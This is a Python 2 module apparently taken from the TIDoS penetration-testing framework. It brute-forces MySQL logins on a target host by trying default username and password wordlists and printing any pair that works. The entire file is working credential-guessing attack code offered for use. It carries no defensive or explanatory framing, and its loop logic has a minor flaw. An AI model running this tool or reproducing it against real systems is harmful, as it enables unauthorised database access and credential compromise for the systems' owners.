#!/usr/bin/env python2
#-*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires TIDoS Framework
#https://github.com/the-Infected-Drake/TIDoS-Framework 

import _mysql
import time
import socket
from colors import *

sqluser = []
sqlpass = []
 
def sqlbrute(web):

	print R+'\n   ==============================='
	print R+'    S Q L   B R U T E F O R C E R'
	print R+'   ===============================\n'
	try:
	    print GR+' [*] Testing target...'
	    ip = socket.gethostbyname(web)
	    m = raw_input(O+' [#] Use IP '+R+str(ip)+O+'? (y/n) :> ')
	    if m == 'y' or m == 'Y':
		pass
	    elif m == 'n' or m == 'N':
		ip = raw_input(O+' [#] Enter IP :> ')

	    print G+' [+] Target appears online...'
	    port = raw_input(GR+' [#] Enter the port (eg. 3306) :> ')

	    try:
		    with open('files/brute-db/sql/sql_defuser.lst','r') as users:
			for u in users:
			    u = u.strip('\n')
			    sqluser.append(u)

		    with open('files/brute-db/sql/sql_defpass.lst','r') as pas:
			for p in pas:
			    p = p.strip('\n')
			    sqlpass.append(p)
	    except IOError:
		print R+' [-] Importing wordlist failed!'

	    for user in sqluser:
		  for password in sqlpass:
			try:
				_mysql.connect(ip,str(user),password,'',port)
				if True:
					print G+' [!] Successful login with ' +O+user+G+ ' and ' +O+password
					break
			except:
	    			print C+' [!] Checking '+B+user+C+' and '+B+password+'...'

	except:
	    print R+' [-] Target seems to be down!'

